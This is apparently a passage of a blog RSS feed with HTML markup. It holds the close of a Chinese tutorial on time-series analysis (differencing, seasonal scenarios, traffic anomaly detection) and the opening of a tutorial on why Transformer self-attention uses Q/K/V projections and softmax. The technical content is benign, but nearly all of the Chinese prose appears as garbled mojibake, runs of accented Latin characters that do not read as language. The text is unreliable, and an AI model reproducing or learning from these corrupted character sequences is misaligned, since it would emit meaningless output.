<p>ç„¶è€Œç°å®æ•°æ®ï¼ˆå¦‚è‚¡ä»·ã€é”€é‡ï¼‰å¾€å¾€æ˜¯ä¸å¹³ç¨³çš„ï¼ˆæœ‰ä¸Šæ¶¨è¶‹åŠ¿ï¼‰ï¼Œå› æ­¤å¦‚æœä½ å‘ç°æ•°æ®ä¸€ç›´åœ¨æ¶¨ï¼Œå¯ä»¥è¯•ç€åš<strong>å·®åˆ†</strong>ï¼ˆç”¨ä»Šå¤©çš„æ•°å‡å»æ˜¨å¤©çš„æ•°ï¼‰ã€‚</p>
<p><strong>å·®åˆ†</strong>åçš„æ•°æ®å¾€å¾€å°±å¹³ç¨³äº†ï¼Œæ›´å®¹æ˜“æ”¾å…¥æ¨¡å‹å»è®­ç»ƒã€‚</p>
<p>å…¶æ¬¡ï¼Œç»“åˆ<strong>ä¸šåŠ¡åœºæ™¯</strong>ï¼Œä¸è¦æ­»è®°ç¡¬èƒŒæ¨¡å‹ï¼Œè¿˜è¦çœ‹åœºæ™¯ã€‚</p>
<p>æ¯”å¦‚ï¼š</p>
<ol>
<li><strong>åœºæ™¯Aï¼šç”µå•†å¤§ä¿ƒé¢„æµ‹ï¼ˆåŒ11ï¼‰</strong>
<ul>
<li><strong>ç‰¹ç‚¹</strong>ï¼šæœ‰æå¼ºçš„å­£èŠ‚æ€§ï¼ˆæ¯å¹´11æœˆæš´æ¶¨ï¼‰ã€‚</li>
<li><strong>ç­–ç•¥</strong>ï¼šé‡ç‚¹åˆ†æ<strong>å­£èŠ‚å˜åŠ¨</strong>ã€‚å¦‚æœåªçœ‹è¶‹åŠ¿ï¼Œä½ ä¼šè¢«åŒ11çš„æ•°æ®å“æ­»ï¼Œæˆ–è€…åœ¨åŒ11å¤‡è´§ä¸è¶³ã€‚</li>
<li><strong>çƒ­ç‚¹å…³è”</strong>ï¼šå°±åƒåˆ†æâ€œæ·„åšçƒ§çƒ¤â€æˆ–â€œå“ˆå°”æ»¨æ—…æ¸¸â€ï¼Œå¿…é¡»è€ƒè™‘èŠ‚å‡æ—¥è¿™ä¸ªå¼ºå­£èŠ‚å› å­ã€‚</li>
</ul>
</li>
<li><strong>åœºæ™¯Bï¼šè‚¡ç¥¨ä»·æ ¼é¢„æµ‹</strong>
<ul>
<li><strong>ç‰¹ç‚¹</strong>ï¼šä¸è§„åˆ™å˜åŠ¨ï¼ˆå™ªéŸ³ï¼‰æå¤§ï¼Œç”šè‡³å™ªéŸ³æ©ç›–äº†è¶‹åŠ¿ã€‚</li>
<li><strong>ç­–ç•¥</strong>ï¼šè¿™ç§æ—¶å€™ï¼Œç®€å•çš„åˆ†è§£æ¨¡å‹å¾€å¾€å¤±æ•ˆã€‚éœ€è¦å¼•å…¥æ›´å¤šå¤–éƒ¨å˜é‡ï¼ˆæ–°é—»ã€æ”¿ç­–ï¼‰ï¼Œæˆ–è€…ä½¿ç”¨æ›´é«˜çº§çš„æ·±åº¦å­¦ä¹ æ¨¡å‹ã€‚</li>
</ul>
</li>
<li><strong>åœºæ™¯Cï¼šæœåŠ¡å™¨æµé‡ç›‘æ§</strong>
<ul>
<li><strong>ç‰¹ç‚¹</strong>ï¼šç™½å¤©é«˜ã€æ·±å¤œä½ï¼Œå‘¨æœ«ä½ã€å·¥ä½œæ—¥é«˜ã€‚</li>
<li><strong>ç­–ç•¥</strong>ï¼šè¿™æ˜¯æœ€æ ‡å‡†çš„å‘¨æœŸæ€§æ•°æ®ï¼Œéå¸¸é€‚åˆç”¨æ¥åšå¼‚å¸¸æ£€æµ‹ï¼ˆæ¯”å¦‚æŸå¤©æ·±å¤œæµé‡çªç„¶æš´æ¶¨ï¼Œè‚¯å®šæ˜¯æœ‰é»‘å®¢æ”»å‡»æˆ–ç³»ç»ŸBugï¼Œå› ä¸ºè¿™è¿èƒŒäº†å­£èŠ‚æ€§è§„å¾‹ï¼‰ã€‚</li>
</ul>
</li>
</ol>
<h2 data-id="heading-8">5. æ€»ç»“ä¸å»ºè®®</h2>
<p><strong>æ—¶é—´åºåˆ—åˆ†æ</strong>å¹¶æ²¡æœ‰æƒ³è±¡ä¸­é‚£ä¹ˆç¥ç§˜ã€‚å®ƒçš„æœ¬è´¨å°±æ˜¯ï¼š<strong>æ‰¿è®¤å†å²ä¼šé‡æ¼”ï¼Œä½†ä¹Ÿæ¥çº³æœªæ¥çš„ä¸ç¡®å®šæ€§ã€‚</strong></p>
<p>å¯¹äºåˆšå…¥è¡Œçš„æœ‹å‹ï¼Œæˆ‘çš„å»ºè®®æ˜¯ï¼š</p>
<ol>
<li><strong>ç†è§£å››å¤§æˆåˆ†</strong>ï¼ˆè¶‹åŠ¿ã€å­£èŠ‚ã€å¾ªç¯ã€å™ªéŸ³ï¼‰æ˜¯åŸºç¡€ä¸­çš„åŸºç¡€ã€‚</li>
<li><strong>æŠ“ä½ä¸»è¦çŸ›ç›¾</strong>ï¼šåœ¨åšé¢„æµ‹æ—¶ï¼Œä¼˜å…ˆæå®šè¶‹åŠ¿å’Œå­£èŠ‚æ€§ã€‚</li>
<li><strong>å¤šåŠ¨æ‰‹å°è¯•</strong>ï¼šæ¯”å¦‚æŠŠä¸Šé¢çš„<code>Python</code>ä»£ç è·‘ä¸€éï¼Œå°è¯•ä¿®æ”¹ä¸€ä¸‹æ•°æ®ï¼Œçœ‹çœ‹ç»“æœæœ‰ä»€ä¹ˆå˜åŒ–ã€‚</li>
</ol>
<p>æœªæ¥çš„åˆ†ææ–¹æ³•è™½ç„¶ä¼šè¶Šæ¥è¶Šå¤šï¼ŒAIä¹Ÿä¼šè¶Šæ¥è¶Šå¼ºï¼Œä½†è¿™ç§ <strong>â€œé€è¿‡ç°è±¡ï¼ˆåŸå§‹æ•°æ®ï¼‰çœ‹æœ¬è´¨ï¼ˆè¶‹åŠ¿ä¸è§„å¾‹ï¼‰â€</strong> çš„åˆ†ææ€ç»´ï¼Œå°†æ˜¯æˆ‘ä»¬èŒä¸šç”Ÿæ¶¯ä¸­æ°¸æ’ä¸å˜çš„å®è´µè´¢å¯Œã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Self-Attention ä¸ºä»€ä¹ˆè¦åš QKV çš„çº¿æ€§å˜æ¢ï¼Ÿåˆä¸ºä»€ä¹ˆè¦åš Softmaxï¼Ÿ]]></title>    <link>https://juejin.cn/post/7588080521446260782</link>    <guid>https://juejin.cn/post/7588080521446260782</guid>    <pubDate>2025-12-28T06:32:19.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7588080521446260782" data-draft-id="7588139768275779635" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Self-Attention ä¸ºä»€ä¹ˆè¦åš QKV çš„çº¿æ€§å˜æ¢ï¼Ÿåˆä¸ºä»€ä¹ˆè¦åš Softmaxï¼Ÿ"/> <meta itemprop="keywords" content="ç®—æ³•"/> <meta itemprop="datePublished" content="2025-12-28T06:32:19.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="coting"/> <meta itemprop="url" content="https://juejin.cn/user/933911964427818"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Self-Attention ä¸ºä»€ä¹ˆè¦åš QKV çš„çº¿æ€§å˜æ¢ï¼Ÿåˆä¸ºä»€ä¹ˆè¦åš Softmaxï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/933911964427818/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    coting
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-28T06:32:19.000Z" title="Sun Dec 28 2025 06:32:19 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-28
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨çœ‹ Transformer çš„ self-attention ç»“æ„æ—¶ï¼Œå¾ˆå¤šäººç¬¬ä¸€æ¬¡è§åˆ° ( Q, K, V ) ä¸‰ä¸ªçŸ©é˜µéƒ½ä¼šæœ‰ç‚¹ç–‘æƒ‘ï¼š<br/>
æ˜æ˜è¾“å…¥å°±æ˜¯ä¸€ä¸ªå‘é‡åºåˆ—ï¼Œä¸ºä»€ä¹ˆè¿˜è¦å¤šæ­¤ä¸€ä¸¾åšä¸‰æ¬¡<strong>çº¿æ€§å˜æ¢</strong>ï¼Ÿ<br/>
è€Œä¸”æœ€åè¿˜è¦å¥—ä¸Šä¸€ä¸ª <strong>Softmax</strong>ï¼Œè¿™åˆæ˜¯åœ¨å¹²ä»€ä¹ˆï¼Ÿ</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e586155be140446dbea559fa5b7aa6f7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY290aW5n:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767508338&amp;x-signature=7UNfPUXhzs%2F%2BRe9l4Ate0blNnM4%3D" alt="" loading="lazy"/></p>
<p>è¿™ä¸¤ä¸ªé—®é¢˜ï¼Œå…¶å®æ˜¯ç†è§£æ³¨æ„åŠ›æœºåˆ¶çš„æ ¸å¿ƒå…³é”®ã€‚<br/>
æˆ‘ä»¬ä»æœ€ç›´è§‚çš„è§’åº¦æ¥æ‹†å¼€çœ‹ã€‚</p>
<p>æ‰€æœ‰ç›¸å…³æºç ç¤ºä¾‹ã€æµç¨‹å›¾ã€é¢è¯•å…«è‚¡ã€æ¨¡å‹é…ç½®ä¸çŸ¥è¯†åº“æ„å»ºæŠ€å·§ï¼Œæˆ‘ä¹Ÿå°†æŒç»­æ›´æ–°åœ¨Githubï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Faicoting%2FAIHub" target="_blank" title="https://github.com/aicoting/AIHub" ref="nofollow noopener noreferrer"><strong>AIHub</strong></a>ï¼Œæ¬¢è¿å…³æ³¨æ”¶è—ï¼</p>
<h2 data-id="heading-0">ä¸€ã€ä¸ºä»€ä¹ˆè¦ Qã€Kã€Vï¼Ÿ</h2>
<p>å‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ªè¾“å…¥åºåˆ—ï¼š<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b86f8dbaf7c545d3b5cd5eb8ed0b7907~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY290aW5n:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767508338&amp;x-signature=%2ByRuytzdHzQFm5eabxPm3H9M1NQ%3D" alt="image" loading="lazy"/></p>
<p>æ¯ä¸ª<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5a9057db7085417d9782855af87577fa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY290aW5n:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767508338&amp;x-signature=LFY5Q5zOXUhl635nh5TMGulim7w%3D" alt="image" loading="lazy"/> å°±æ˜¯ä¸€ä¸ª token çš„ embeddingï¼Œæ¯”å¦‚ä¸€ä¸ªè¯ã€ä¸€ä¸ªå­—ã€æˆ–è€…ä¸€ä¸ªå›¾åƒ patchã€‚<br/>
å¦‚æœæˆ‘ä»¬ç›´æ¥ç”¨è¿™äº›<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/240fd555cf83454d9323b47e6204b997~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY290aW5n:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767508338&amp;x-signature=sMJBCqPE%2FNHGzNtO1nmLteYkV%2Fs%3D" alt="image" loading="lazy"/> ä¹‹é—´åšç‚¹ç§¯ï¼š<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e438e1b00f0d43f9be1904d8b1cb7bea~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY290aW5n:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767508338&amp;x-signature=4Yhuda1E%2FQ9%2FMSaCCcEtv9N6dgs%3D" alt="image" loading="lazy"/></p>
<p>å®ƒç¡®å®èƒ½åæ˜ å‡ºä¸¤ä¸ª token çš„ç›¸å…³æ€§ï¼ˆè¶Šå¤§è¶Šç›¸å…³ï¼‰ï¼Œä½†å­˜åœ¨ä¸¤ä¸ªè‡´å‘½é—®é¢˜ï¼š</p>
<ol>
<li><strong>æ¯ä¸ª token çš„è¡¨ç¤ºæ˜¯é™æ€çš„</strong>ï¼šè¾“å…¥ embedding æ²¡æœ‰åŒºåˆ†<strong>è°åœ¨å…³æ³¨åˆ«äºº</strong>è¿˜æ˜¯<strong>è¢«åˆ«äººå…³æ³¨</strong>ã€‚</li>
<li><strong>æ— æ³•è¡¨è¾¾ä¸åŒçš„å…³æ³¨æ¨¡å¼</strong>ï¼šæ‰€æœ‰ token çš„å…³ç³»éƒ½è¢«ä¸€ä¸ªå›ºå®šç©ºé—´æè¿°ï¼Œæ¨¡å‹æ— æ³•çµæ´»å­¦ä¹ ä¸åŒè§’åº¦çš„ç›¸ä¼¼æ€§ã€‚</li>
</ol>
<p>äºæ˜¯å°±å¼•å‡ºäº† Qã€Kã€V çš„è®¾è®¡ã€‚</p>
<h2 data-id="heading-1">äºŒã€Qã€Kã€V çš„çº¿æ€§å˜æ¢åœ¨å¹²ä»€ä¹ˆï¼Ÿ</h2>
<h3 data-id="heading-2">1.æŠ•å½±åˆ°ä¸åŒå­ç©ºé—´</h3>
<p>è¾“å…¥çš„ç‰¹å¾ç»´åº¦æ˜¯ <img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e4d62ecac89f4b06b530a0dd448443ec~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY290aW5n:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767508338&amp;x-signature=lxT54XhrMcuSK%2BDRYZDdZbUdBfE%3D" alt="image" loading="lazy"/>ï¼Œæ¯ä¸ª token çš„ embedding åŒ…å«<strong>æ‰€æœ‰è¯­ä¹‰ä¿¡æ¯</strong>ã€‚</p>
<p>ç›´æ¥ç”¨åŸå§‹ embedding åš Q/K/Vï¼Œç›¸å½“äºåœ¨åŒä¸€ä¸ªç©ºé—´è®¡ç®—ç›¸ä¼¼åº¦ï¼Œæ¨¡å‹<strong>æ— æ³•å­¦ä¹ ä¸åŒè¯­ä¹‰å…³ç³»çš„æƒé‡</strong>ã€‚</p>
<p>æˆ‘ä»¬æŠŠè¾“å…¥ ( X ) åˆ†åˆ«çº¿æ€§å˜æ¢æˆä¸‰ç§è¡¨ç¤ºï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1c47ecaa73f844c98ba4c31eee678419~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY290aW5n:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767508338&amp;x-signature=qadyxYmu1a9uA7SPWKiQNColD5k%3D" alt="image" loading="lazy"/></p>
<ul>
<li><strong>Queryï¼ˆæŸ¥è¯¢ï¼‰</strong>ï¼šè¡¨ç¤ºæˆ‘æƒ³å…³æ³¨ä»€ä¹ˆä¿¡æ¯</li>
<li><strong>Keyï¼ˆé”®ï¼‰</strong>ï¼šè¡¨ç¤ºæˆ‘æ˜¯ä»€ä¹ˆæ ·çš„ä¿¡æ¯</li>
<li><strong>Valueï¼ˆå€¼ï¼‰</strong>ï¼šè¡¨ç¤ºæˆ‘æºå¸¦çš„ä¿¡æ¯å†…å®¹</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e55b612b5f4a4d47ac965b091eb91af3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY290aW5n:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767508338&amp;x-signature=S3yhVBcSteo0CMBjW9qE2a8YsQg%3D" alt="" loading="lazy"/></p>
<p>è¿™ä¸‰ä¸ªçŸ©é˜µå…¶å®æ˜¯ä»åŒä¸€ä¸ªè¾“å…¥ (X) æŠ•å½±å‡ºæ¥çš„ä¸‰ç§<strong>è§†è§’</strong>ã€‚<br/>
è¿™ä¸€æ­¥çš„ä½œç”¨ï¼Œå°±æ˜¯<strong>è®©æ¨¡å‹åœ¨ä¸åŒå­ç©ºé—´ä¸­ç†è§£ token ä¹‹é—´çš„å…³ç³»</strong>ã€‚</p>
<p>ä¸¾ä¸ªç®€å•çš„ä¾‹å­ï¼š<br/>
åœ¨ä¸€å¥è¯ä¸­ï¼Œâ€œä»–åƒäº†ä¸€ä¸ªè‹¹æœâ€ï¼Œ<br/>
â€œä»–â€è¿™ä¸ªè¯ï¼ˆQueryï¼‰å¯èƒ½æ›´å…³æ³¨â€œåƒâ€è¿™ä¸ªåŠ¨è¯ï¼Œè€Œâ€œåƒâ€è¿™ä¸ªè¯ï¼ˆKeyï¼‰å¯èƒ½æ›´å¤šåœ°è¢«åè¯å¸å¼•ã€‚</p>
<p>é€šè¿‡ä¸‰ç»„ç‹¬ç«‹çš„çº¿æ€§å˜æ¢ï¼Œæ¨¡å‹å¯ä»¥å­¦ä¹ åˆ°è¿™ç§ä¸åŒè§’è‰²çš„åŒ¹é…å…³ç³»ã€‚</p>
<p>æ‰€ä»¥ä½ å¯ä»¥è¿™æ ·ç†è§£ï¼ŒQ æ˜¯æ³¨æ„åŠ›çš„<strong>æé—®æ–¹å¼</strong>ï¼ŒK æ˜¯ä¿¡æ¯çš„<strong>èº«ä»½æè¿°</strong>ï¼ŒV æ˜¯æœ€ç»ˆè¢«æå–çš„<strong>ä¿¡æ¯å†…å®¹</strong>ã€‚</p>
<h3 data-id="heading-3">2.æ”¯æŒå¤šå¤´æ³¨æ„åŠ›</h3>
<p>å¤šå¤´æ³¨æ„åŠ›æŠŠ Q/K/V åˆ‡åˆ†æˆå¤šä¸ªå¤´ï¼Œæ¯ä¸ªå¤´å…³æ³¨ä¸åŒå­ç©ºé—´çš„ç‰¹å¾ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/97f0b5e3f83f47e1b160f3d457e16b93~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY290aW5n:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767508338&amp;x-signature=u7J5vXihvAUQ%2FnZ5fR5Tu%2FO0BHo%3D" alt="" loading="lazy"/></p>
<p>å¦‚æœæ²¡æœ‰çº¿æ€§å˜æ¢ï¼Œæ¯ä¸ªå¤´å¾—åˆ°çš„è¿˜æ˜¯åŸå§‹ embeddingï¼Œæ— æ³•å­¦ä¹ å¤šè§’åº¦å…³ç³»ã€‚</p>
<p>çº¿æ€§æŠ•å½±å…è®¸æ¯ä¸ª head <strong>ç‹¬ç«‹å­¦ä¹ ä¸€å¥—æŸ¥è¯¢/é”®/å€¼è¡¨ç¤º</strong>ï¼Œæå‡æ¨¡å‹è¡¨è¾¾èƒ½åŠ›ã€‚</p>
<p>å…¬å¼ï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a9d2ec503f7945f685068c30b47e5ac9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY290aW5n:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767508338&amp;x-signature=PjOPACEi3PV8cdwwBQtOL1vkD5g%3D" alt="image" loading="lazy"/><br/>
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ba5b9be9914b4f08bd0773439f1c2aee~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY290aW5n:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767508338&amp;x-signature=S8y%2Bs0y2xnZnUtApQz8a62uZvAc%3D" alt="image" loading="lazy"/></p>
<h3 data-id="heading-4">3.å¢åŠ å¯å­¦ä¹ å‚æ•°</h3>
<p>æ¯ä¸ªçº¿æ€§å˜æ¢ W_Q, W_K, W_Véƒ½æ˜¯ <strong>å¯è®­ç»ƒæƒé‡</strong>ï¼Œæ¨¡å‹å¯ä»¥è‡ªåŠ¨å­¦ä¹ å¦‚ä½•å¯¹ä¸åŒ token çš„ embedding åšä¸åŒçš„æŸ¥è¯¢ã€åŒ¹é…å’ŒåŠ æƒã€‚</p>
<p>è¿™ä½¿å¾— self-attention ä¸åªæ˜¯ä¸€ä¸ªå›ºå®šçš„ç›¸ä¼¼åº¦è®¡ç®—ï¼Œè€Œæ˜¯ä¸€ä¸ª <strong>å¯è°ƒèŠ‚ã€å¯ä¼˜åŒ–çš„è¯­ä¹‰åŒ¹é…å‡½æ•°</strong>ã€‚</p>
<h3 data-id="heading-5">4.ä¾¿äºä¸‹æ¸¸æ“ä½œ</h3>
<p>QK^T è®¡ç®—çš„æ˜¯æ³¨æ„åŠ›æƒé‡ï¼Œå¦‚æœä¸åšçº¿æ€§å˜æ¢ï¼Œæ¨¡å‹åªèƒ½ä¾èµ–åŸå§‹ embedding çš„å†…ç§¯ï¼Œè¿™ç§ç›¸ä¼¼åº¦ç©ºé—´ä¸ä¸€å®šé€‚åˆ softmax åŠ æƒã€‚</p>
<p>çº¿æ€§å˜æ¢å¯ä»¥æŠŠ embedding æŠ•å½±åˆ°æ›´é€‚åˆåš<strong>æ³¨æ„åŠ›åŒ¹é…</strong>çš„ç©ºé—´ï¼Œæé«˜å­¦ä¹ èƒ½åŠ›ã€‚</p>
<h2 data-id="heading-6">ä¸‰ã€Q ä¸ K çš„ç‚¹ç§¯</h2>
<p>æ‹¿åˆ° Q å’Œ K åï¼Œself-attention è®¡ç®—çš„æ˜¯æ¯ä¸ª Query ä¸æ‰€æœ‰ Key çš„ç›¸ä¼¼åº¦ï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/23e4c56e257f4c49a789bcad38f23b4f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY290aW5n:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767508338&amp;x-signature=O4eHDAusy8OpmKQ1fkwwQwqrWMY%3D" alt="image" loading="lazy"/></p>
<p>è¿™é‡Œçš„ç‚¹ç§¯ä»£è¡¨<strong>åŒ¹é…ç¨‹åº¦</strong>ï¼Œå³ï¼š</p>
<ul>
<li>Q_i è¡¨ç¤ºç¬¬ i ä¸ª token æƒ³å…³æ³¨çš„ä¿¡æ¯ï¼›</li>
<li>K_j è¡¨ç¤ºç¬¬ j ä¸ª token æ‰€åŒ…å«çš„ä¿¡æ¯ï¼›</li>
<li>å®ƒä»¬çš„ç‚¹ç§¯è¶Šå¤§ï¼Œè¯´æ˜ç¬¬ i ä¸ª token è¶Šåº”è¯¥å…³æ³¨ç¬¬ j ä¸ª tokenã€‚</li>
</ul>
